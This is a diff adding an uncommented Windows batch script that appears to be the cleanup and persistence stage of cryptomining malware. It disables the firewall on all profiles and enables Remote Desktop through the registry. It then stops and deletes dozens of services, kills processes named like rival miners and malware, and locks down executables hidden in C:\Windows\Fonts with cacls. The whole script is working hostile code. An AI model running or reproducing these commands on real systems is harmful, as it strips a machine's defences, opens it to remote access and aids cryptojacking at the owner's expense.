@@ -1,0 +1,76 @@
+netsh advfirewall set allprofiles state off
+net stop TeamViewer
+sc config PolicyAgent start= auto
+REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f
+net stop wk
+net stop Microsoft.NET_Framework_NGEN
+net stop VMwareATE
+net stop WindowsATE
+net stop Windows32_Update
+net stop HelpSvcss
+net stop "Help Service"
+net stop WECS
+net stop mssecsvc2.0
+net stop system_update
+net stop system_updatea
+net stop Systemss
+net stop nthost
+net stop Servc
+taskkill /im mssecsvc.exe /f
+taskkill /im nthost /f
+taskkill /im winhost /f
+taskkill /im mscorsvw.exe /f
+taskkill /im WUDFHost.exe /f
+taskkill /im jlguaji.exe /f
+taskkill /im NsCpuCNMiner32.exe /f
+taskkill /im NsCpuCNMiner64.exe /f
+taskkill /im spoolsvs.exe /f
+taskkill /im taskhost.exe /f
+taskkill /im NsCpuapl.exe /f
+taskkill /im nheqminer_zcash.exe /f
+taskkill /im nssm.exe /f
+taskkill /im update.exe /f
+taskkill /im Update64.exe /f
+taskkill /im cssrsss /f
+taskkill /im cssrssu /f
+taskkill /im winhlp32.exe /f
+taskkill /im server.exe /f
+taskkill /im sppscv.exe /f
+taskkill /im syatemm.exe /f
+taskkill /im lsasss.exe /f
+sc delete nthost
+sc delete Servc
+sc delete mssecsvc2.0
+sc delete Systemss
+sc delete WMIserver
+sc delete WMIservers
+sc delete WMI
+sc delete Serv
+sc delete system_update
+sc delete system_updatea
+sc delete VMwareATE
+sc delete Windows32_Update
+sc delete "Help Service"
+sc delete HelpSvcss
+sc delete WECS
+echo y|cacls "C:\Windows\SysWOW64\cssrssu.exe" /t /p everyone:n
+echo y|cacls "C:\Windows\Fonts\sppsvc.exe" /t /p everyone:n
+echo y|cacls "C:\Windows\Fonts\mscorsvw.exe" /t /p everyone:n
+echo y|cacls "C:\Windows\mscorsvw.exe" /t /p everyone:n
+echo y|cacls "C:\Windows\Fonts\sppsrv.exe" /t /p everyone:n
+echo y|cacls "C:\Windows\Fonts\svchost.exe" /t /p everyone:n
+echo y|cacls "C:\Windows\Fonts\conhost.exe" /t /p everyone:n
+echo y|cacls "C:\Windows\Fonts\alg.exe" /t /p everyone:n
+echo y|cacls "C:\Windows\Fonts\spoolsv.exe" /t /p everyone:n
+echo y|cacls "C:\Windows\Fonts\sqlservr.exe" /t /p everyone:n
+echo y|cacls "C:\Windows\Fonts\taskhost.exe" /t /p everyone:n
+echo y|cacls "C:\Windows\Fonts\notepad.exe" /t /p everyone:n
+echo y|cacls "C:\Windows\Fonts\systens.exe" /t /p everyone:n
+echo y|cacls "C:\Windows\Fonts\mscorsvw.exe" /t /p everyone:n
+echo y|cacls "C:\Windows\Fonts\system.exe" /t /p everyone:n
+echo y|cacls "C:\Windows\Fonts\explorer.exe" /t /p everyone:n
+echo y|cacls "C:\Windows\Fonts\csrss.exe" /t /p everyone:n
+echo y|cacls "C:\Windows\mssecsvc.exe" /t /p everyone:n
+echo y|cacls "C:\Windows\Fonts" /t /p everyone:r
+echo y|cacls "C:\Windows\debug\wk" /t /p everyone:f
+exit
